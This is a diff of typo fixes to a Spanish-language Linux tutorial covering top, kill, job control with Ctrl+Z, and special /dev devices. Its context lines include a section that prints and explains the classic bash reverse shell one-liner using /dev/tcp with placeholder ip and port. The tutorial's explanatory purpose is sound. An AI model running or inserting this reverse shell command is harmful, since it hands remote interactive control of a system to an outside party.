@@ -184,7 +184,7 @@ Interactividad (pulsando teclas en ejecucion):
 - T : ordenar por tiempo
 - P : ordenar por uso de cpu
 
-*(Si te gustaria que tuviera mejor interantividad y apariencia prueba* htop*)*
+*(Si te gustaria que tuviera mejor interantividad y apariencia prueba* htop *)*
 
 #### KILL
 Se ejecuta de la siguiente manera:
@@ -397,7 +397,7 @@ De esta forma el proceso correria en segundo plano y mantendriamos el control de
 #### CTRL+Z:
 Sirve para suspender un programa en seguno plano.
 
-De forma similar al &, sobre un proceso corriendo, podemos presionar Ctrl+Z y esto enviara a segundo plano el proveso.
+De forma similar al &, sobre un proceso corriendo, podemos presionar Ctrl+Z y esto enviara a segundo plano el proceso.
 
 En lugar de dejarlo corriendo, lo deja suspendido en espera de volver a primer plano.
 
@@ -516,7 +516,7 @@ Hay ciertos dispositivos especiales que otorgan funcionamientos especificos de c
 - /dev/tcp/ip/puerto : representa una conexion tcp hacia fuera con el peurto y la ip especificadas
 - /dev/udp/ip/puerto : representa una conexion udp hacia fuera con el puerto y la ip especificadas
 - /dev/stdout , /dev/stdin, /dev/stderr : las representaciones literales de la salida y entrada.
-- /dev/fd/N : si N es un int valido, representa los descriptores de fichero propios.
+- /dev/fd/N : si N es un numero valido, representa los descriptores de fichero propios.
 
 #### Redireccion de Reverse Shell
 Para poner un ejemplo real, la tipica reverse Shell de bash:
@@ -525,7 +525,7 @@ bash -i >& /dev/tcp/ip/puerto 0>&1
 ```
 Entonces:
 - bash -i: : Inicia una instancia interactiva de bash.
-- >& /dev/tcp/ip/puerto : envia la salida de error y estandard por la conexion TCP
+- \>& /dev/tcp/ip/puerto : envia la salida de error y estandard por la conexion TCP
 - redirige la entrada estandard hacia el mismo destino que la salida estandard.
 
 En resumen estamos enviando todas las entradas y salidas por el dispositivo /dev/tcp/ip
